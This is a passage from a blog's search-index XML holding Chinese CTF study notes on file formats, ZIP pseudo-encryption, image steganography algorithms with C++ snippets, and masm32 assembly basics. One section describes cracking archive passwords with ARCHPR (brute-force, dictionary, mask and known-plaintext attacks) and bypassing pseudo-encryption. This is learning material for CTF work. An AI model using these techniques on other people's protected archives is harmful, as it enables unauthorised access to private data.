title="七、压缩文件工具"></a>七、压缩文件工具</h2><h3 id="1-360Zip"><a href="#1-360Zip" class="headerlink" title="1 360Zip"></a>1 360Zip</h3><blockquote><p>压缩工具</p></blockquote><h3 id="2-ARCHPR"><a href="#2-ARCHPR" class="headerlink" title="2 ARCHPR"></a>2 ARCHPR</h3><blockquote><p>压缩包爆破</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 文件分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件理论知识</title>
      <link href="/posts/71be2b51.html"/>
      <url>/posts/71be2b51.html</url>
      
        <content type="html"><![CDATA[<h1 id="File理论"><a href="#File理论" class="headerlink" title="File理论"></a>File理论</h1><blockquote><p><a href=".\a2cc6fde">text::文件工具</a></p></blockquote><hr><h2 id="一、其他"><a href="#一、其他" class="headerlink" title="一、其他"></a>一、其他</h2><h3 id="1-十六进制"><a href="#1-十六进制" class="headerlink" title="1 十六进制"></a>1 十六进制</h3><blockquote><p>注意十六进制数是否大于 0x7b ，大于的话可能要 % 128。</p></blockquote><h3 id="2-flag别名"><a href="#2-flag别名" class="headerlink" title="2 flag别名"></a>2 flag别名</h3><blockquote><p>flag、f14g、f1ag、fl4g</p></blockquote><hr><h2 id="二、文件"><a href="#二、文件" class="headerlink" title="二、文件"></a>二、文件</h2><h3 id="1-文件基础"><a href="#1-文件基础" class="headerlink" title="1 文件基础"></a>1 文件基础</h3><ul><li><p>文件类型与关系</p><ul><li><p>图片文件</p><ul><li>.jpg：有损压缩 </li><li>.png：无损压缩</li><li>.bmp：无压缩</li><li>.webp：仅Chrome支持的图片</li></ul></li><li><p>文本文件</p><ul><li>.doc：文档</li><li>.docx：扩展文档（可插pdf）</li><li>.pdf：可携带文件格式</li></ul></li><li><p>压缩包文件</p><blockquote><p><a href="https://www.cnblogs.com/itps/articles/12774936.html">详谈rar,zip,7z不同点以及优缺点</a></p></blockquote><ul><li>.7z：压缩率最高</li><li>.rar：安全性高</li><li>.zip：使用范围广</li></ul></li><li><p>音视频文件</p><ul><li>.wav：波形声音文件</li><li>.mp3：音频压缩技术</li><li>.mp4：动态图像专家组</li></ul></li><li><p>可扩展标识语言</p><ul><li>.xml：可扩展标识语言</li></ul></li><li><p>可执行文件</p><ul><li>.exe：可执行文件</li></ul></li></ul></li><li><p>文件头</p><blockquote><p><a href="https://zhuanlan.zhihu.com/p/158980459">链接</a></p></blockquote><ul><li><p>jpg/jpeg</p><blockquote><p>头：FF D8 </p><p>尾：FF D9</p></blockquote></li><li><p>zip/jar/zipx</p><blockquote><p>头：50 4B 03 04</p></blockquote></li><li><p>pyc</p><blockquote><p>头：03 F3</p></blockquote></li></ul></li></ul><h3 id="2-压缩包"><a href="#2-压缩包" class="headerlink" title="2 压缩包"></a>2 压缩包</h3><h4 id="2-1-ZIP文件"><a href="#2-1-ZIP文件" class="headerlink" title="2.1 ZIP文件"></a>2.1 ZIP文件</h4><blockquote><p><a href="https://blog.csdn.net/a200710716/article/details/51644421">文件格式</a>    <a href="https://pkware.cachefly.net/webdocs/APPNOTE/APPNOTE-6.2.0.txt">官方文档</a>    <a href="https://blog.csdn.net/u012567068/article/details/73611526">压缩原理</a></p></blockquote><ul><li><p>压缩源文件信息</p><ul><li>数据区头：50 4B 03 04</li><li>目录区头：50 4B 01 02</li><li>目录结束标志头：50 4B 05 06</li></ul></li><li><p>伪加密</p><blockquote><p><a href="https://zhuanlan.zhihu.com/p/399456259">伪加密</a></p><p>全局方式位标记的四个数字中只有第二个数字对其有影响，其它的不管为何值，都不影响它的加密属性。</p></blockquote><ul><li><p>第二个数字为奇数时 –&gt;加密</p><blockquote><p>数据区的全局方式位标记应当为 09 00</p><p>目录区的全局方式位标记应当为 09 00</p><p>数据区全局方位：7-8 B，目录区全局方位：9-10 B</p></blockquote></li><li><p>第二个数字为偶数时 –&gt;未加密</p><blockquote><p>数据区的全局方式位标记应当为 00 00</p><p>目录区的全局方式位标记应当为 00 00</p></blockquote></li></ul></li></ul><h4 id="2-2-RAR文件"><a href="#2-2-RAR文件" class="headerlink" title="2.2 RAR文件"></a>2.2 RAR文件</h4><h4 id="2-3-压缩包爆破"><a href="#2-3-压缩包爆破" class="headerlink" title="2.3 压缩包爆破"></a>2.3 压缩包爆破</h4><blockquote><p>伪加密：观察全局方位。</p></blockquote><ul><li><p>步骤</p><ol><li>用 010editor 进行编辑</li><li>binwalk -e 无视伪加密</li><li>在 macOS 及部分 Linux（kali） 中，可以直接打开伪加密的 zip</li><li>检测伪加密工具 ZipCenOp.jar</li><li>用 WinRAR 修复</li></ol></li><li><p>ARCHPR</p><ul><li><p>爆破攻击</p><blockquote><p>攻击类型暴力，选择范围，选择长度，开始暴力。</p></blockquote></li><li><p>字典攻击</p><blockquote><p>攻击类型字典，载入字典。</p></blockquote></li><li><p>掩码攻击</p><blockquote><p>攻击类型掩码，构造掩码，如（???venus??），? 会被字符代替。</p></blockquote></li><li><p>明文攻击</p><blockquote><p>攻击类型明文，选择 CRC32 值一致的明文文件，攻击同 CRC32 值的加密文件。</p></blockquote></li></ul></li></ul><h3 id="2-图片"><a href="#2-图片" class="headerlink" title="2 图片"></a>2 图片</h3><ul><li><p>二维码 &amp; 条形码</p><blockquote><p><a href="https://online-barcode-reader.inliteresearch.com/">识别网站</a></p></blockquote></li></ul><h3 id="3-Office"><a href="#3-Office" class="headerlink" title="3 Office"></a>3 Office</h3><ul><li><p>doc</p><ul><li><p>Question</p><ul><li><p>图片被文字遮挡</p><blockquote><p>设置全部行为单倍行距。</p></blockquote></li><li><p>wingdings字体<img src="/posts/71be2b51/wingdings.jpg" alt="img"></p></li></ul></li></ul></li><li><p>excel</p></li><li><p>ppt</p></li><li><p>pdf</p></li></ul><hr><h2 id="三、隐写"><a href="#三、隐写" class="headerlink" title="三、隐写"></a>三、隐写</h2><h3 id="1-常规步骤"><a href="#1-常规步骤" class="headerlink" title="1 常规步骤"></a>1 常规步骤</h3><ol><li>binwalk + WinHex：分析文件内部结构和内部数据。</li><li>StegSolve：分析LSB隐写。</li><li>Stegdetect：特殊隐写。</li></ol><h3 id="2-基本概念"><a href="#2-基本概念" class="headerlink" title="2 基本概念"></a>2 基本概念</h3><h4 id="2-1-信息隐藏"><a href="#2-1-信息隐藏" class="headerlink" title="2.1 信息隐藏"></a>2.1 信息隐藏</h4><ul><li><p>信息隐藏要求</p><blockquote><p>每当一个性质的能力得到提升，另外两个就会下降，所以要在三者中寻找一个平衡。</p></blockquote><ol><li>无法被感知。</li><li>隐写容量：足够用。</li><li>鲁棒性：抵御攻击能力。</li></ol></li><li><p>阈下信道</p><blockquote><p>定义：阈值以下的信息无法被感知。</p></blockquote></li></ul><h3 id="3-隐写类型"><a href="#3-隐写类型" class="headerlink" title="3 隐写类型"></a>3 隐写类型</h3><h4 id="3-1-图片隐写"><a href="#3-1-图片隐写" class="headerlink" title="3.1 图片隐写"></a>3.1 图片隐写</h4><blockquote><p><a href="https://github.com/Magialeaf/Misc/tree/main/Image/Hidden">My::隐写全例</a></p></blockquote><h5 id="3-1-1-基础隐写"><a href="#3-1-1-基础隐写" class="headerlink" title="3.1.1 基础隐写"></a>3.1.1 基础隐写</h5><blockquote><p>RGB：红绿蓝，三个通道，每个 8 位。值越小越黑，越大越白。（RGB888 / 三通道图 / BGR）</p><p>灰度图：单通道图像。（GRAY）</p><p>位图：0,1构成，只有黑白。</p><p>单通道：一个矩阵，每个位置存一个像素点信息，8b，每位会形成一张图像，越高位越影响图像外形，最终图像是由这8位图像共同组成。所以在低位隐写难以被发现。</p><p>LSB隐写指最低有效位隐写，通常只在无损压缩或无压缩的图片上实现LSB隐写。JPG无法LSB隐写。</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 灰度隐写</span></span><br><span class="line"><span class="comment">// 获得低位值。</span></span><br><span class="line">img.<span class="built_in">at</span>(i, j) &amp; <span class="number">1</span>;</span><br><span class="line"><span class="comment">// 判断色彩丰富度。（分成黑白两种色用于隐写）</span></span><br><span class="line">logo.<span class="built_in">at</span>(i, j) &gt; <span class="number">128</span>;</span><br><span class="line"><span class="comment">// 修改低位值。（异或改掉最低位）</span></span><br><span class="line">img.<span class="built_in">at</span>(i, j) ^= <span class="number">1</span>;</span><br><span class="line"><span class="comment">// 明显显示低位值（0-&gt;0：黑色，1-&gt;255：白色）</span></span><br><span class="line">res.<span class="built_in">at</span>(i, j) *= <span class="number">255</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 彩色隐写</span></span><br><span class="line"><span class="comment">// 基本同理灰度隐写，：三通道隐写。（数组类型）</span></span><br><span class="line"><span class="comment">// 新定义一张图用来接收隐写后图的最低位值。（CV_8UC1：一个通道）</span></span><br><span class="line"><span class="function">Mat <span class="title">solve</span><span class="params">(row, col, CV_8UC1)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 联合隐写</span></span><br><span class="line">img.at[ now ];</span><br><span class="line"><span class="comment">// now = row_now / ((row / 3) + 1))（+1是防止越界）</span></span><br><span class="line"><span class="comment">// 或 now = row_now % 3</span></span><br><span class="line"><span class="comment">// 或直接改成加密函数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 可见水印</span></span><br><span class="line"><span class="comment">// 原理：改变透明度 a，让一张图片嵌在另一张图片上（a:double）</span></span><br><span class="line">Vec3b c = img_c * a + logo_c * (<span class="number">1</span> - a);</span><br></pre></td></tr></table></figure><h5 id="3-1-2-加密隐写"><a href="#3-1-2-加密隐写" class="headerlink" title="3.1.2 加密隐写"></a>3.1.2 加密隐写</h5><blockquote><p>———————Arnold置乱———————<br>Arnold置乱是一种映射方法。（Mapping）</p><p>矩阵运算如下（N是行列值，必须相等）：<br>[ x’ ] = [ 1       a    ] <em> [ x ] mod N<br>[ y’ ] = [ b   ab+1 ] </em> [ y ] mod N</p><p>逆矩阵：<br>[ x ] = [ ab+1  -b ] <em> [ x’ ] mod N<br>[ y ] = [   -a       1 ] </em> [ y’ ] mod N</p><p>周期性：次数 c &lt;= N ** 2 / 2，否则会重复置换。</p><p>联合隐写+ Arnold置乱：抗剪切性好，因为点是打散的。</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 当 a = b = 1 时就是 Cat-mapping，写成行列式 如下：</span></span><br><span class="line">_x = ( x + y ) mod N;</span><br><span class="line">_y = ( x + <span class="number">2</span>*y ) mod N;</span><br><span class="line"><span class="comment">// 逆变换行列式：</span></span><br><span class="line">x = ( <span class="number">2</span>*_x -_y ) mod N;</span><br><span class="line">y = ( -_x + _y ) mod N;</span><br><span class="line"><span class="comment">// 注：C语言可能会算出负数，其他语言取模不会</span></span><br><span class="line">y =  (y+N) % N;</span><br></pre></td></tr></table></figure><h5 id="3-1-3-混沌序列"><a href="#3-1-3-混沌序列" class="headerlink" title="3.1.3 混沌序列"></a>3.1.3 混沌序列</h5><blockquote><p>混沌系统：是指那些在微小的初始条件下会呈现出长期不可预测的行为的非线性动力学系统。</p><p>混沌序列：序列，混乱，不可预测。（自然序列，斐波那契数列也是混沌序列，但混沌度低）</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 随机数置乱</span></span><br><span class="line"><span class="built_in">srand</span>(key);</span><br><span class="line">key = <span class="keyword">for</span>(key.<span class="built_in">at</span>&lt;uchar&gt;(i,j) = <span class="built_in">rand</span>() % <span class="number">256</span>); </span><br><span class="line"><span class="comment">// 加密</span></span><br><span class="line">hide = img ^ key;</span><br><span class="line"><span class="comment">// 解密</span></span><br><span class="line">img = hide ^ key;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 随机数生成：线性同余法（简单，混沌度高）（主要是 c，c 是大质数时周期就大）</span></span><br><span class="line"><span class="built_in">F</span>(n) = ( a * <span class="built_in">F</span>(n<span class="number">-1</span>) + b ) % c;</span><br><span class="line"><span class="comment">//使用时还需要取mod保证范围 </span></span><br><span class="line"><span class="built_in">F</span>(n) %= mod</span><br></pre></td></tr></table></figure><h5 id="3-1-4-序列隐写"><a href="#3-1-4-序列隐写" class="headerlink" title="3.1.4 序列隐写"></a>3.1.4 序列隐写</h5><ul><li><p>字符串隐写</p><blockquote><p>隐写：字符串可以和网络包一样加包头，隐写在任意位置的杂乱信息中。读取时可以按长度读取，也可以读取过长长度找到该字符串。</p><p>特点：隐蔽性和容量大，鲁棒性较差。</p></blockquote></li><li><p>载体选择</p><ol><li><p>最低有效位。</p></li><li><p>选择纹理丰富区域，而非光滑区域。</p><blockquote><p>纹理值计算：计算梯度出现纹理线。</p></blockquote></li><li><p>颜色区域。鲜艳区域少嵌入，阴沉区域多嵌入。</p></li><li><p>随机选择载体。（类似分子不规则运动）</p><blockquote><p>序列：隐写的序列为二进制序列，因为要隐写在最低位。</p></blockquote></li></ol></li><li><p>梯度</p><blockquote><p>梯度：当前点值 - 上一像素点值 &gt; 临界值（例：10），纹理就会出现。</p><p>上一值：上下左右皆可。</p><p>联合梯度：上一值选为上和左，将计算结果加起来，判断是否大于临界值。</p></blockquote><ol><li><p>二值图片</p><p><code>((img.at&lt;uchar&gt;(i, j) - img.at&lt;uchar&gt;(i-1, j))&gt;10) *255;</code></p></li><li><p>防负图片</p><p><code>(abs(img.at&lt;uchar&gt;(i, j) - img.at&lt;uchar&gt;(i-1,j))) *10;</code></p></li></ol></li></ul><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// StrtoBin</span></span><br><span class="line">num = ((key[i] &amp; (<span class="number">1</span> &lt;&lt; (<span class="number">7</span> - j))) &gt; <span class="number">0</span>);</span><br><span class="line"><span class="comment">// BintoStr</span></span><br><span class="line">temp = temp * <span class="number">2</span> + key_bin[i+j];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Encode</span></span><br><span class="line">last_bit = last_bit - (last_bit &amp; <span class="number">1</span>);</span><br><span class="line">last_bit |= vector[p];</span><br><span class="line"><span class="comment">// Decode</span></span><br><span class="line">temp += res.<span class="built_in">at</span>&lt;uchar&gt;(i, j) &amp; <span class="number">1</span>;</span><br><span class="line">string += temp;</span><br></pre></td></tr></table></figure><h5 id="3-1-5-矩阵编码"><a href="#3-1-5-矩阵编码" class="headerlink" title="3.1.5 矩阵编码"></a>3.1.5 矩阵编码</h5><p><strong>改1嵌2</strong></p><blockquote><p>目的：a1,a2,a3,x1,x2。只改一个a嵌入两个x。</p><p>通过算期望判断好坏：LSB单隐写 50% 概率改1个，改1嵌2矩阵隐写 75% 改 2 个。因此该隐写优于LSB单隐写。</p></blockquote><ul><li>嵌入<ol><li>x1 = a1 ^ a3 , x2 = a2 ^ a3 ; a 不变。</li><li>x1 != a1 ^ a3 , x2 = a2 ^ a3 ; a1反。</li><li>x1 = a1 ^ a3 , x2 != a2 ^ a3 ; a2反。</li><li>x1 != a1 ^ a3 , x2 != a2 ^ a3 ; a3反。</li></ol></li><li>提取：<ul><li>x1 = a1 ^ a3 , x2 = a2 ^  a3 ;</li></ul></li></ul><p><strong>改1嵌n</strong></p><blockquote><p>目的：a1-a7,x1,x2,x3。只改1个a嵌入三个x。</p><p>案例：假设你是一名科研人员，有64瓶无色无味的溶液，其中1瓶有毒，已知小白鼠喝下溶液后第二天会死，现在需要你分析出哪瓶为有毒溶液。小白鼠可以同时喝下多瓶溶液，问：至少需要多少只小白鼠。</p><p>答案：6只，二进制序列。</p><script type="math/tex; mode=display">\left[\begin{array}{c|cc}0&0&0&0&1&1&1&1\\0&0&1&1&0&0&1&1\\0&1&0&1&0&1&0&1\end{array}\right]</script><p>汉明纠错码：4bit数据3bit冗余。</p><p>分组奇偶：对应上面矩阵异或值为0</p><p>1：1357列异或。</p><p>2：2367列异或。</p><p>4：4567列异或。</p></blockquote><div class="table-container"><table><thead><tr><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th></tr></thead><tbody><tr><td>3</td><td>2</td><td>data</td><td>1</td><td>data</td><td>data</td><td>data</td></tr></tbody></table></div><blockquote><ul><li>数学原理如下：</li></ul><script type="math/tex; mode=display">f(a)=\left[\begin{array}{c|cc}0&0&0&0&1&1&1&1\\0&0&1&1&0&0&1&1\\0&1&0&1&0&1&0&1\end{array}\right]*\left[\begin{array}{c}a1\\a2\\a3\\a4\\a5\\a6\\a7\end{array}\right]=\left[\begin{array}{c}z1\\z2\\z3\end{array}\right]</script><script type="math/tex; mode=display">s=\left[\begin{array}{c}z1\\z2\\z3\end{array}\right]\oplus\left[\begin{array}{c}z1\\z2\\z3\end{array}\right]=\left[\begin{array}{c}z1\\z2\\z3\end{array}\right]</script><p>异或双方分别是原数据和新数据分别与左边矩阵乘算的结果，然后再进行异或后发现需要进行改正的数据，从而完成隐写。</p><ul><li>公式表达如下：</li></ul><script type="math/tex; mode=display">f(a) =\bigotimes_{i=1}^n a_i*i</script><script type="math/tex; mode=display">s=x \oplus f(a)</script><script type="math/tex; mode=display">a'=[a_1,a_2,...,a_s,a_{s+1},...,a_n]</script></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 改正数据完成一个单位数据的隐写</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">EnMatrixCode</span><span class="params">(vector&lt;<span class="type">int</span>&gt; a, vector&lt;<span class="type">int</span>&gt; x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> n = a.<span class="built_in">size</span>(), m = x.<span class="built_in">size</span>();</span><br><span class="line"></span><br><span class="line"><span class="built_in">assert</span>(n == (<span class="number">1</span> &lt;&lt; m) - <span class="number">1</span>); <span class="comment">// n == 2 ^ m - 1</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fa = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">fa ^= (a[i - <span class="number">1</span>] * i);</span><br><span class="line"><span class="type">int</span> xx = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++)</span><br><span class="line">xx += x[i] * (<span class="number">1</span> &lt;&lt; i);</span><br><span class="line"><span class="keyword">return</span> fa ^ xx;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 逆改正</span></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">DeMatrix</span><span class="params">(vector&lt;<span class="type">int</span>&gt; a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> n = a.<span class="built_in">size</span>();</span><br><span class="line"><span class="type">int</span> m = <span class="built_in">log2</span>(n + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">vector&lt;<span class="type">int</span>&gt; x;</span><br><span class="line"><span class="type">int</span> fa = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">fa ^= (a[i - <span class="number">1</span>] * i);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; i++)</span><br><span class="line">&#123;</span><br><span class="line">x.<span class="built_in">push_back</span>(fa % <span class="number">2</span>);</span><br><span class="line">fa /= <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3-2-音频隐写"><a href="#3-2-音频隐写" class="headerlink" title="3.2 音频隐写"></a>3.2 音频隐写</h4>]]></content>
      
      
      <categories>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 文件分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>masm32汇编</title>
      <link href="/posts/b81b1ca5.html"/>
      <url>/posts/b81b1ca5.html</url>
      
        <content type="html"><![CDATA[<h1 id="masm32汇编"><a href="#masm32汇编" class="headerlink" title="masm32汇编"></a>masm32汇编</h1><blockquote><p><a href="https://www.cnblogs.com/lsdb/p/7402955.html">masm32下载</a></p></blockquote><hr><h2 id="〇、环境配置"><a href="#〇、环境配置" class="headerlink" title="〇、环境配置"></a>〇、环境配置</h2><ol><li><p>下载安装</p><blockquote><p>注 Win10 下可能安装失败。（兼容打开，或关闭防火墙）</p></blockquote></li><li><p>环境配置</p></li></ol><div class="table-container"><table><thead><tr><th>变量名</th><th>变量值</th></tr></thead><tbody><tr><td>include</td><td>D:\masm32\include</td></tr><tr><td>lib</td><td>D:\masm32\lib</td></tr><tr><td>PATH</td><td>D:\masm32\bin</td></tr></tbody></table></div><ol><li><p>执行</p><ul><li><p>编译：<code>ml /c /coff eg.asm</code></p><blockquote><p>源程序：*.asm</p><p>包含文件：*.inc（列表文件：*.lst）</p></blockquote><p>链接：<code>link /subsystem:console eg.obj [eg.lib...]</code></p><blockquote><p><code>link /OUT:eg.lib eg.obj</code>：指明库文件编译</p><p>目标模块文件：*.obj</p><p>库文件：*.lib</p></blockquote></li></ul><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">事先设置好后使用：MAKE32.BAT <span class="number">1</span>.asm</span><br><span class="line">设置如下</span><br><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="comment">REM make32.bat,for assembling and linking 32-bit Console programs(.exe)</span></span><br><span class="line">ml /c /coff /Fl /Zi %<span class="number">1</span>.asm</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">errorlevel</span> <span class="number">1</span><span class="keyword">goto</span> terminate</span><br><span class="line">link /subsystem:console /debug %<span class="number">1</span>.obj</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">errorlevel</span> <span class="number">1</span><span class="keyword">goto</span> terminate</span><br><span class="line">:terminate</span><br><span class="line">@<span class="built_in">echo</span> on</span><br></pre></td></tr></table></figure></li></ol><hr><h2 id="一、masm32汇编"><a href="#一、masm32汇编" class="headerlink" title="一、masm32汇编"></a>一、masm32汇编</h2><h3 id="1-基础汇编"><a href="#1-基础汇编" class="headerlink" title="1 基础汇编"></a>1 基础汇编</h3><h4 id="1-1-寄存器"><a href="#1-1-寄存器" class="headerlink" title="1.1 寄存器"></a>1.1 寄存器</h4><blockquote><p><a href=".\a8fb0b6e">text::基础汇编</a></p><p><a href=".\8d4b7ae1">text::计算机组成原理</a></p><p>扩展寄存器：EAX，EBX，ECX，EDX，ESI，EDI，EBP，ESP，EIP</p><p>未扩展寄存器：CS，DS，ES，FS，GS</p></blockquote><h4 id="1-2-头文件"><a href="#1-2-头文件" class="headerlink" title="1.2 头文件"></a>1.2 头文件</h4><div class="table-container"><table><thead><tr><th>伪指令</th><th>功能</th><th>伪指令</th><th>功能</th></tr></thead><tbody><tr><td>.8086</td><td>仅接受8086指令（缺省状态）</td><td>.387</td><td>接受80387数学协处理器指令</td></tr><tr><td>.186</td><td>接受80186指令</td><td>.No87</td><td>取消使用协处理器指令</td></tr><tr><td>.286</td><td>接受除特权指令外的80286指令</td><td>.586</td><td>接受除特权指令外的Pentium指令</td></tr><tr><td>.286P</td><td>接受全部80286指令，包括特权指令</td><td>.586P</td><td>接受全部的Pentium指令</td></tr><tr><td>.386</td><td>接受除特权指令外的80386指令</td><td>.686</td><td>接受除特权指令外的Pentium Pro指令</td></tr><tr><td>.386P</td><td>接受全部80386指令，包括特权指令</td><td>.686P</td><td>接受全部Pentium Pro指令</td></tr><tr><td>.486</td><td>接受除特权指令外的80486指令，包括浮点指令</td><td>.MMX</td><td>接受MMX指令</td></tr><tr><td>.486P</td><td>接受全部80486指令，包括特权指令和浮点指令</td><td>.K3D</td><td>接受AMD处理器的3D指令</td></tr><tr><td>.8087</td><td>接受8087数学协处理器指令</td><td>.XMM</td><td>接受SSE，SSE2和SSE3指令</td></tr><tr><td>.287</td><td>接受80287数学协处理器指令</td><td></td></tr></tbody></table></div><h4 id="1-3-io32-inc中的输入输出"><a href="#1-3-io32-inc中的输入输出" class="headerlink" title="1.3 io32.inc中的输入输出"></a>1.3 io32.inc中的输入输出</h4><div class="table-container"><table><thead><tr><th>C语言格式符</th><th>子程序名</th><th>参数</th><th>常用功能</th></tr></thead><tbody><tr><td>printf(“%s”,a)</td><td>dispmsg</td><td>入口：EAX=字符串地址</td><td>显示字符串（以0结尾）</td></tr><tr><td>printf(“%c”,a)</td><td>dispc</td><td>入口：AL=ASCII码</td><td>显示一个字符</td></tr><tr><td>printf(“\n”)</td><td>dispcrlf</td><td></td><td>光标回车换行，到下一行首位置</td></tr><tr><td></td><td>disprd</td><td></td><td>显示8个32为通用寄存器内容（十六进制）</td></tr><tr><td></td><td>disprf</td><td></td><td>显示6个状态标志的状态</td></tr><tr><td>print(“%X”,a)</td><td>disphd</td><td>入口：EAX=32b数据</td><td>以16进制显示8位数据</td></tr><tr><td>print(“%u”,a)</td><td>dispuid</td><td>入口：EAX=32b数据</td><td>显示无符号十进制数</td></tr><tr><td>print(“%d”,a)</td><td>dispsid</td><td>入口：EAX=32b数据</td><td>显示有符号十进制数</td></tr><tr><td>scanf(“%s”,&amp;a)</td><td>readmsg</td><td>入口：EAX=缓冲区地址。出口：EAX=实际输入的字符个数（不含结尾0），字符串以0结尾</td><td>输入一个字符串（回车结束）</td></tr><tr><td>scanf(“%c”,&amp;a)</td><td>readc</td><td>出口：AL=ASCII码</td><td>输入一个字符（回显）</td></tr><tr><td>scanf(“%X”,&amp;a)</td><td>readhd</td><td>出口：EAX=32b数据</td><td>输入8为十六进制数</td></tr><tr><td>scanf(“%u”,&amp;a)</td><td>readuid</td><td>出口：EAX=32b数据</td><td>输入无符号十进制数</td></tr><tr><td>scanf(“%d”,&amp;a)</td><td>readsid</td><td>出口：EAX=32b数据</td><td>输入有符号十进制数</td></tr></tbody></table></div><h3 id="2-数据表示与寻址"><a href="#2-数据表示与寻址" class="headerlink" title="2 数据表示与寻址"></a>2 数据表示与寻址</h3><h4 id="2-1-伪指令"><a href="#2-1-伪指令" class="headerlink" title="2.1 伪指令"></a>2.1 伪指令</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;等价EQU，等号=</span><br><span class="line">;EQU：给符号名定义一个数值或另一个字符串，甚至可以是处理器指令</span><br><span class="line">;EQU用于数值等价时不能重复定义符号名，但是&#x27;=&#x27;可以</span><br><span class="line">符号名 EQU 数值表达式</span><br><span class="line">符号名 EQU &lt;字符串&gt;</span><br><span class="line">符号名 = 数值表达式</span><br></pre></td></tr></table></figure><h4 id="2-2-变量定义"><a href="#2-2-变量定义" class="headerlink" title="2.2 变量定义"></a>2.2 变量定义</h4><blockquote><p>定义</p><ul><li>变量 变量定义伪指令 处置表</li><li>变量定义伪指令 重复次数 dup(重复参数)</li></ul><p>除了如下定义汇编还支持：Structure（结构），Record（记录），Union（联合）</p></blockquote><div class="table-container"><table><thead><tr><th>老版</th><th>新版</th><th>作用</th></tr></thead><tbody><tr><td>db</td><td>byte</td><td>1B</td></tr><tr><td>dw</td><td>word</td><td>2B</td></tr><tr><td>dd</td><td>dword</td><td>4B</td></tr><tr><td>df</td><td>fword</td><td>6B，多用于16b段选择器和32b偏移地址的48b指针地址</td></tr><tr><td>dq</td><td>qword</td><td>8B</td></tr><tr><td>dt</td><td>tbyte</td><td>10B，多用于BCD码，浮点运算</td></tr></tbody></table></div><h4 id="2-3-变量指令"><a href="#2-3-变量指令" class="headerlink" title="2.3 变量指令"></a>2.3 变量指令</h4><div class="table-container"><table><thead><tr><th>属性</th><th>操作符</th><th>作用</th></tr></thead><tbody><tr><td><strong>地址</strong></td><td>[]</td><td>将括起的表达式作为存储器地址指针</td></tr><tr><td></td><td>$</td><td>返回当前偏移地址</td></tr><tr><td></td><td>offset 变量名</td><td>返回变量名所在段的偏移地址</td></tr><tr><td></td><td>seg 变量名</td><td>返回段基地址（实地址存储模型）</td></tr><tr><td><strong>类型</strong></td><td>类型名 ptr 变量名</td><td>将变量名按照指定的类型使用</td></tr><tr><td></td><td>type 变量名</td><td>返回一个字量数值，表明变量名的类型</td></tr><tr><td></td><td>lengthof 变量名</td><td>返回整个变量的数据项数（即元素数）</td></tr><tr><td></td><td>sizeof 变量名</td><td>返回整个变量占用的字节数</td></tr></tbody></table></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;伪指令，将参数表达的偏移地址作为当前偏移地址</span><br><span class="line">org para</span><br><span class="line"></span><br><span class="line">;伪指令，对齐，N是对齐数（2的平方）</span><br><span class="line">align N</span><br><span class="line">;伪指令，偶对齐（相当于align 2）</span><br><span class="line">even</span><br></pre></td></tr></table></figure><h3 id="3-通用数据处理指令"><a href="#3-通用数据处理指令" class="headerlink" title="3 通用数据处理指令"></a>3 通用数据处理指令</h3><h4 id="3-1-数据操作指令"><a href="#3-1-数据操作指令" class="headerlink" title="3.1 数据操作指令"></a>3.1 数据操作指令</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;数据交换</span><br><span class="line">xchg si,di</span><br><span class="line"></span><br><span class="line">;获得偏移地址（offset在编译阶段就获得了，但是lea可以动态获得）</span><br><span class="line">lea esi,label</span><br><span class="line"></span><br><span class="line">;换码指令([AL]=[EBX+AL])，用于字典</span><br><span class="line">xlat</span><br><span class="line"></span><br><span class="line">;求补指令([rem]=0-[rem])</span><br><span class="line">neg rem</span><br><span class="line"></span><br><span class="line">;有符号乘法</span><br><span class="line">imul reg/mem</span><br><span class="line">;双/三操作数乘法</span><br><span class="line">imul reg,reg/mem/imm</span><br><span class="line">imul reg,reg/mem,imm</span><br><span class="line"></span><br><span class="line">;有符号除法</span><br><span class="line">idiv reg/mem</span><br><span class="line"></span><br><span 